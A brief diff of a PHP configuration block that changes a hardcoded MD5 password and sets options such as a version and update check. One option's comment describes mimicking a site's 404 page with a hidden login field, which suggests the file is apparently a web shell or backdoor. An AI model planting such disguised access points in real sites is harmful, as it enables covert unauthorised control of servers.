@@ -1,5 +1,5 @@
 <?php
-$pass               = md5("hf");
+$pass               = md5("pw");
 $version            = 3.31;
 $adaptiveerrorpage  = true; //Get Default 404 page and replicate it, but add a login text field in the center at the bottom
 $checkforupdates    = true;
